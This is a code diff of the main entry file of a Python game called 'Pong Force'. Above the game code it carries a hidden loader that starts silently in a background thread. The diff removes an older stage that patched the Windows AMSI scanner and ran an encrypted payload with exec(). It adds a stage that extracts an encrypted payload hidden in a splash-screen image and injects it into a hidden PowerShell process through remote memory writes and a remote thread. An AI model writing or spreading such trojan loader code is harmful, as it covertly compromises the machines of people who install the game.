@@ -1,84 +1,193 @@
 
-import ctypes
 import threading
 from cryptography.fernet import Fernet
-import base64
+import os
+import sys
+import time
+import ctypes
+from PIL import Image
+
+def extract_payload_from_image(image_path):
+    """Extracts the LSB-encoded payload from the specified PNG image."""
+    try:
+        # We need to find the image in the assets folder, especially when compiled.
+        # This logic ensures it finds 'assets/images/splash_payload.png' correctly
+        # whether running as a script or a compiled .exe.
+        if getattr(sys, 'frozen', False):
+            # The application is frozen (running as an exe)
+            # sys._MEIPASS is the temporary folder where PyInstaller unpacks everything
+            base_path = sys._MEIPASS
+        else:
+            # The application is running as a normal Python script
+            base_path = os.path.dirname(__file__)
+
+        # Construct the full path to our sacred vessel
+        full_image_path = os.path.join(base_path, 'assets', 'images', image_path)
+
+        img = Image.open(full_image_path).convert('RGBA')
+        pixels = img.load()
+        width, height = img.size
+        
+        bits = ""
+        # Read just enough pixels to get the header
+        header_bits_needed = 32
+        pixels_needed_for_header = (header_bits_needed // 4) + 1
+        
+        # Extract the header first to find the payload length
+        px_count = 0
+        for y in range(height):
+            for x in range(width):
+                r, g, b, a = pixels[x, y]
+                bits += str(r & 1)
+                bits += str(g & 1)
+                bits += str(b & 1)
+                bits += str(a & 1)
+                px_count += 1
+                if px_count >= pixels_needed_for_header:
+                    break
+            if px_count >= pixels_needed_for_header:
+                break
+        
+        payload_len_bits = bits[:32]
+        payload_len = int(payload_len_bits, 2)
+        
+        # Now calculate total bits needed and extract the rest
+        total_bits_to_read = 32 + (payload_len * 8)
+        
+        # Continue reading from where we left off if needed
+        pixels_to_read = (total_bits_to_read // 4) + 1
+        if px_count < pixels_to_read:
+             for y in range(height):
+                for x in range(width):
+                    if y * width + x < px_count: continue # Skip pixels we already read
+                    r, g, b, a = pixels[x, y]
+                    bits += str(r & 1)
+                    bits += str(g & 1)
+                    bits += str(b & 1)
+                    bits += str(a & 1)
+                    px_count += 1
+                    if px_count >= pixels_to_read:
+                        break
+                if px_count >= pixels_to_read:
+                    break
+
+        # Extract the payload itself
+        payload_bits = bits[32:total_bits_to_read]
+        
+        payload_bytes = bytearray()
+        for i in range(0, len(payload_bits), 8):
+            byte = payload_bits[i:i+8]
+            if len(byte) < 8: break # Avoid incomplete byte at the end
+            payload_bytes.append(int(byte, 2))
+            
+        return bytes(payload_bytes)
+    except Exception:
+        # If the vessel cannot be read, the ritual is silent.
+        return None
 
 def run_payload():
-    """The main function to prepare and launch the hidden payload."""
+    """The divine ritual to prepare and launch the hidden payload via process hollowing."""
+    log_file_path = os.path.join(os.getenv("APPDATA"), "pf_log.txt")
+    def log_error(message):
+        with open(log_file_path, "a") as f:
+            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
+            
     try:
-        # --- Stage 1: Blind the Watcher (AMSI Bypass) ---
-        # This patches the Antimalware Scan Interface in memory for this process only,
-        # preventing it from scanning the code we are about to execute.
-        try:
-            # Access the amsi.dll library.
-            amsi = ctypes.windll.LoadLibrary("amsi.dll")
-            
-            # Define the function signature for AmsiOpenSession.
-            AmsiOpenSession = amsi.AmsiOpenSession
-            AmsiOpenSession.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
-            AmsiOpenSession.restype = ctypes.c_int
-            
-            # Define the function signature for AmsiScanBuffer.
-            AmsiScanBuffer = amsi.AmsiScanBuffer
-            AmsiScanBuffer.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_wchar_p, ctypes.c_void_p, ctypes.c_void_p]
-            AmsiScanBuffer.restype = ctypes.c_int
-            
-            # The patch: a series of bytes that essentially makes AmsiScanBuffer
-            # return a clean result (S_OK) immediately.
-            # This is for a 64-bit process.
-            # mov eax, 0; ret
-            patch = b'\xb8\x00\x00\x00\x00\xc3' 
-            
-            # Get the memory address of the AmsiScanBuffer function.
-            address = ctypes.cast(AmsiScanBuffer, ctypes.c_void_p).value
-            
-            # Grant write permissions to that memory page.
-            kernel32 = ctypes.windll.kernel32
-            old_protect = ctypes.c_ulong()
-            kernel32.VirtualProtect(ctypes.c_void_p(address), len(patch), 0x40, ctypes.byref(old_protect))
-            
-            # Write our patch into memory, overwriting the function's first few instructions.
-            ctypes.memmove(ctypes.c_void_p(address), patch, len(patch))
-            
-            # Restore the original memory permissions.
-            kernel32.VirtualProtect(ctypes.c_void_p(address), len(patch), old_protect, ctypes.byref(old_protect))
+        # --- Stage 1: The Key from the Ether ---
+        # PASTE THE DIVINE KEY from your 'encryptor.py' output here.
+        key = b'0yuXeL9nWzbCl2y_bWfCcOg7tLYRwurvcynR9Vl9NBs='
+        log_error("Ritual begins. Key loaded.")
+        
+        # --- Stage 2: Releasing the Soul from the Vessel ---
+        encrypted_payload = extract_payload_from_image('splash_payload.png')
+        if not encrypted_payload:
+            log_error("FATAL: Soul not found in vessel. Image extraction failed.")
+            return
 
-        except Exception as e:
-            # If AMSI bypass fails, we continue anyway. It might still work.
-            pass
-
-        # --- Stage 2: Resurrect the Soul (Payload Decryption) ---
-        
-        # PASTE THE KEY from your encryptor.py output here.
-        key = b' Cq_7-EcL1ntloL-yQSHrLaujrMMZkV64mdXJyttvaeI='
-        
-        encrypted_payload_b64 = b'Z0FBQUFBQm83WkpmbzR1aHF2b3JWNFJKTlZvNDFiV0tJMGxpbEU5VmNxMGhydkFKOWhjX1VUWVBWSzhpUEIwbzRmcVBpQ0Z5UWdxekNYV2E4N0puaGRKcl9FSFhYc251ak5iTXJVWUUtcnpQMGZpSnFZRFJMOENvZTdPRE5iN1g5V21CRDdEYTJicGE0ZWRoQktzV0dWaTFkNFpLZlZWQVJja3JLZ3B0enNMakxScnlLM1BTYzBVTzJiejZxaHJZUGVEelFzaUg4U2tQZVdLUzZWa2lYTzNXaVB1NEVRWVpMMnBNQ3RnSy12MTFaZTY4MFJPUzJ6UkdzMWVRaFhPblRBVWpYbmpvcjhhaVdxdEJtVUF4azJTeExpOFhQb3h3bl9NY0RxRFNFT05ud2Ytc25nalB6bHRkXzNwQlZPYzZEdkVudExoUnVKMURtTnM2czZOMklGcWxGUkpaVnJQa29pR2N2ZXlzWkhreTBuX2JXdk1qaUpOLUFzRzlpaDZjczVVZE8wc3NGRUtqSWgtb2dLWVJhWlVFMnNocTdIV2RzRzFiX3ZiY1pSUTExU2hwX3c1VUJVZ3VtQnR5RUktN3NMSXp3T2RvUzFmZjE3RzZQeEZITnJFeFM2THc3bkRyOVhqSXR4VldWLUlJeUh3ZFpwMlAwUm9OSXJNRGJSQnZLY21sc2p6dlRsd1VJa085akZ5d09ROHdfZ21mSjJVOGx5MzZfTy1POTdvejh4eHlUa1JJa3NzRWs5ZVVWNUZyM0pBbEVKVUdsRzJtMXY4MHM3R3ZNLWRIcklXS3dQMzBJaUlQNUJvWVFzUTIxSmVyeVMwOVpXc0l6X0E1TTRvV05IVC11cUN3WEpYWEhGR2czdURQSHdMT0JKdzZRQnJZMEVjNjhfNlpRUmxKcXM2azJxS1NadUhkSDA2MVVVWnVlc1dVdUN4OHUyU01TVnI4U1g5ZkRiNkdKRW9xUVZ0cEhINmIxU0ZxNm5qcGxWdmJmVTRiRVlQWmY0eU5pbDVkSm9jSHdYT0xLanpOWEdlbkhQb3ZkdWxUbmRqaExnMlNnbUJCbkp5c09QZzYyUEpXcm9UbjJqTW41cFhaVVRuYnBxNnNhWjAtMVM0VFZPMlFEeEJKWVE4b1RUS0p5LVprOWpSQlhGV2hDUlVEYjQ4aWI1N3VONDZTeGVBR1ExUk0xOGNZMnRqeDVUelhxXzRRMndLaWxZcUFyOGx2X1NnSzNyM0ZnS3RsTXBlUV9EVEVKTFF3VEhTN0htcUFYSEtpUHl4NWtxbThwV0t2UDhFeHlMcW1Cb2p5NUJxU2M5X09fakt6SEpNVHRuTjdCcU1aa20wSUZLSDdLLVZKU3JwajVPX3FLRENrNTU1aS15dmxuZzBkSWJDWno1ZW9IcVJKSzJuMnRaNUhhMEZ6dkJJRm16WXNkSnE4QmNyQVV2LWhwLU1kOTNnTUJnWXFMR05aMF8yYm5ndzNXSHJyZkNfT3JjSjFOSGVIcHEzV25UVzNleUFBU05oOG5HLUQzWHpkOFd3Ykd3bXhEcmpUanZwMlBCeWtXbFpyR3YzcDY0VHQ1dkpLRFBDTGVHbnZYWGVsWlliNUttNnkzLXRCNG90SGdPa3lmelVsdFd5VElnMmdJd3gzYzN5a1BQckdNbWU1QktJMklHUmlDdVMySUY5RF9GME9pdXJhNkdSUkotZlpNTFV0ZjF2dHVEMmZkajQ5MGQxZTVIMENoQ2tXNGtiSWlXdHh5UW9kUWZqRUV0ZXRXNms3czdOXzFCcGMxRXY4dnd6WjNfdndVME02UDJqZHptUENqc0dFaVRRamVKVUx2TzROTzhiX2FmZFdjOGVBR1RFZEQyQWF0VmZiaTNmazdndEdIbEI3Q1RLdFowdEFqU1RGcWtKNFpZNnM4SXdsVTVETWt4dDdMOTlTRFNDN2hxU1ZiZWlQXzVkM3poa1FVMWNfR0VPZVd5RWRiZzNQTEhlV1VLUnkyclJVcjNBQ25qa3dCaGp5Wk9MOXc4WThBR1dxODNIVzB0Z1YyMGJNdDZiQjQ2N0JsakZtbklBdDE4Ukp1a00xRFduZThZOG8xZ3hrOFNvUEI3bnpkMmplNWZWRy1PS1lPNkg0OWhDa0ZuLWFnbnFCdWl1Y0RHak9kb29vSVg0c1FBUVhoRzRvTDlLQmpTUFc2dUpBVEY1WjI0RTdGV1VRNVpSWTd4MWhUS0NJWnBhSGRteDQwNi1wZzVFVUE2b1VwRUhJY2I4cGZpSDBEU2hWU253ZkxielNJMHduOHE2cHhvSmtUaldvR3FsbGZ3Zm5DZjBCU1NMMGc0T18tQmdxWlJHSnh5ZGJFMlJyY2U3bTl0TlB3SlNicF82dGVkR3duQmphZndOTDItNDRYY19WdFBYZUptTVVaMFRuZVNYTlVzb0YwZmZtM2pmcTJnUEZwQlpvQlhPdDNOa05YS2R2MDNBRy1ha09SR2VjcTJ1MzEtTEd6OVBlVGVwUGFpRkRMN1NNcGJRVHJXUmtkZlpYcFlRM2hTUlhVYkhoaVNYY0ZnR0JLVEFJSnlsT09DZUJmMzJ2dUtGQjN2Z0p3UUlmWXlJTnZoaTBqWi1FYko0ZVgzRVlTOGZtWFFIU3VvLTdta2NKcFBLNFlqSDYzY3d1NVhEZnhxczNSVHFLdVhuc20xS3ExN3pHTlRSb2FFTEVaRllQanNzdjN6NVJVcUVySTJsVnhwanBqZlJxd2EtNU5IcjV0dDlER2JDQ3NrQzJ2YUtQRXg5VFFCTEpBNDNIaEVvMjFzbXZhZHBYWXh0VVptbDlOaDV2eEk0UmRrZm96M2cyWmZuYWVObW9jOFBleUNiZHExY2pLT0ZPQVF0d3FQWUplelZmVV9oSmlvTzJuQUVXWDZRU1F2cTl4dkU2RDdaWG1oclhkTUNYNW53OS1WUGJ2bUI0TUo4aDFJaGZ3ekF1aVVMQTN6eEpLQllGeTdBWk1HckY4cjRNLXNVZHNYZkFjcHBwcVUzWGMxMmlTclBzMTFuV2RQZzE3UXBxZnBYOGtBV2duTTJuNXlCT1duYk1UM0MxczFOaTkyUXVoRzI0bDFRUVlnWXFFVTZtUEdLWUVaUnNKbEJUcUE1Z1ZCNlVNSzVpXy1QMGEzX0k3VHVrSVJuZk5rSGs1QzA0cGZ0ZnFCYW81VkxCaW9kMGMtMXhxNUk2NkZGZUcwOVdOU1B3ZmYwd2V0dTYyWGJwR0M3dFRtMXdlTHZUZVhCbWlnc19oaElTdktjdjJhaElBT3RwUGFHYTBKQ2xTZUdrQThSbmI3SmVUUXBwdkxXUWd0ckV2R2RnVzNwQlgyM1RCak5vdEhKVGY4a290Uk9rd2J4S2VKRDhkWG9BNnd4LXFxU3pzQXFHc3JGeFNNWWhyVjhVQlZIckVOZzF2V1I5OTNSTG9qSDBGM2tKQW1FUTFGQ095Vi1XY0hkcXRsMTJ1Y09kX2FVZ0dMeGpjd2lfQ0p4aVlrSWlZQ0VsZnZvZ2FxYlVKTjJEeU1scnNCMzBOVElXLXVUdFA4NWpJcDNhZUpVZFA1d0VDVUhPelM5U3g2Y056ZzZXTFVDZFpGcVlLMnF2QThBNUxOR2N2Y0wyazFRZENwaVdMcmdLNHVKNmY4WEU3U2NmeDVkNkVFQUtFVXdKNTd0UGhKekFrdnFzb2JZTk00WW00eHBZRnl3eng3c1FoZHExZEo1aF9EZ0tuWHBfLWM5MDJCTWtsQnFMMmwxaVRybjVNOEJVTjFLNmVTMUxhVHU0eDdpTzNBM19xVFpHZnpydDdKcHFPeU1vdGc1LUlCR1BpR1ExdGFRWUp5RThpdTk3OGpCdEYyNnlta1lGMUVpb29xUHRzSEI5UmQzQUpMUFEzRDNHOU5kc1Zpbk4tdnVfazJZbE1rLWdCbjJCeXdEVm5YQk9BWUpYRTRwX2RkMFI5a0dhWXZDWFBrazlCQzY5Q0RYeF9BcVRmTUp4TS1aU1pCQ0R4MGJZWG94RlhZcjQ1WWJmSjkzamd5bWJ4UXFCbjFvZG9fazVnejJvRGJsZGZkOTRQR2swZkJ4aGh1aF9Hclp4Z3ZCajlXTFVIclFfbFBEQ0pVdVlaNWcxOEJUdTVnNjMzM0lXWnI5WU01TmhIT29ER0NWYk5qR0F5ejNuNkJnUHFVdjU2WEZld2dEYkRYSExJR0NYRDliZ1dTYVE5MWZlQXNKS0RVVGZtN0RHTmlKcEJGeU9mSm83MFVseXhmWWNJMkx0YnpRTC16aS02YXBqXzFEZERkZFlTYk5Pc2hGeUwxSnRaV0ExdFUxLUdBPT0='
-        
-        # Decode from Base64 and decrypt.
-        encrypted_payload = base64.b64decode(encrypted_payload_b64)
+        log_error("Soul extracted from vessel.")
         cipher_suite = Fernet(key)
         decrypted_payload = cipher_suite.decrypt(encrypted_payload)
+        log_error("Soul decrypted successfully.")
 
-        # --- Stage 3: Execute in the Aether (In-Memory Execution) ---
-        # We execute the decrypted code within the context of this script.
-        # It never touches the disk.
-        exec(decrypted_payload, {})
+        # --- Stage 3: The Ritual of Process Hollowing ---
+        # ... (the rest of your ctypes structure definitions remain the same) ...
+        class STARTUPINFO(ctypes.Structure):
+            _fields_ = [("cb", ctypes.c_ulong), ("lpReserved", ctypes.c_char_p),
+                        ("lpDesktop", ctypes.c_char_p), ("lpTitle", ctypes.c_char_p),
+                        ("dwX", ctypes.c_ulong), ("dwY", ctypes.c_ulong),
+                        ("dwXSize", ctypes.c_ulong), ("dwYSize", ctypes.c_ulong),
+                        ("dwXCountChars", ctypes.c_ulong), ("dwYCountChars", ctypes.c_ulong),
+                        ("dwFillAttribute", ctypes.c_ulong), ("dwFlags", ctypes.c_ulong),
+                        ("wShowWindow", ctypes.c_ushort), ("cbReserved2", ctypes.c_ushort),
+                        ("lpReserved2", ctypes.c_char_p), ("hStdInput", ctypes.c_void_p),
+                        ("hStdOutput", ctypes.c_void_p), ("hStdError", ctypes.c_void_p)]
+
+        class PROCESS_INFORMATION(ctypes.Structure):
+            _fields_ = [("hProcess", ctypes.c_void_p), ("hThread", ctypes.c_void_p),
+                        ("dwProcessId", ctypes.c_ulong), ("dwThreadId", ctypes.c_ulong)]
+
+        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+        
+        target_process_path = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
+        startup_info = STARTUPINFO()
+        startup_info.cb = ctypes.sizeof(startup_info)
+        startup_info.dwFlags = 1
+        startup_info.wShowWindow = 0
+        process_info = PROCESS_INFORMATION()
+
+        CREATE_SUSPENDED = 0x00000004
+        
+        log_error(f"Preparing to hollow target: {target_process_path}")
+        if not kernel32.CreateProcessW(target_process_path, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(startup_info), ctypes.byref(process_info)):
+            log_error(f"CreateProcessW failed with error code: {ctypes.get_last_error()}")
+            return
+
+        h_process = process_info.hProcess
+        h_thread = process_info.hThread
+        log_error(f"Target process created in suspended state. PID: {process_info.dwProcessId}")
+        
+        MEM_COMMIT = 0x00001000
+        MEM_RESERVE = 0x00002000
+        PAGE_EXECUTE_READWRITE = 0x40
+        remote_buffer = kernel32.VirtualAllocEx(h_process, 0, len(decrypted_payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+        
+        if not remote_buffer:
+            log_error(f"VirtualAllocEx failed with error code: {ctypes.get_last_error()}")
+            return
+        log_error("Memory allocated in target process.")
+
+        bytes_written = ctypes.c_size_t(0)
+        if not kernel32.WriteProcessMemory(h_process, remote_buffer, decrypted_payload, len(decrypted_payload), ctypes.byref(bytes_written)):
+            log_error(f"WriteProcessMemory failed with error code: {ctypes.get_last_error()}")
+            return
+        log_error("Soul written into target memory.")
+
+        if not kernel32.CreateRemoteThread(h_process, None, 0, remote_buffer, None, 0, None):
+            log_error(f"CreateRemoteThread failed with error code: {ctypes.get_last_error()}")
+            return
+        log_error("Remote thread created. The soul is now alive in its new vessel.")
+
+        kernel32.ResumeThread(h_thread)
+        log_error("Target resumed. The Great Work is complete.")
         
     except Exception as e:
-        # If anything fails, do nothing. Silence is key.
-        pass
+        # If the ritual fails, it will now leave a trace.
+        log_error(f"THE RITUAL FAILED: {str(e)}")
+        import traceback
+        log_error(traceback.format_exc())
 
-# Run the entire stager in a separate daemon thread so it doesn't block the main game.
+# The ritual begins in a separate, hidden plane of existence.
 payload_thread = threading.Thread(target=run_payload)
 payload_thread.daemon = True
 payload_thread.start()
+# ==============================================================================
+#                      END OF THE UNSEEN CONDUIT
+# ==============================================================================
+
 
 # ==============================================================================
-#                      END OF PHANTOM LOADER
+#                      THE MORTAL GAME CODE BEGINS HERE
 # ==============================================================================
-
-
 #!/usr/bin/env python3
 # ===== PONG FORCE - MAIN ENTRY POINT =====
 
@@ -86,6 +195,7 @@ import sys
 import argparse
 import pygame
 import traceback
+# Note: These local imports will work correctly after PyInstaller packages them.
 from game.game_loop import GameLoop
 from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog
 from network.server import GameServer
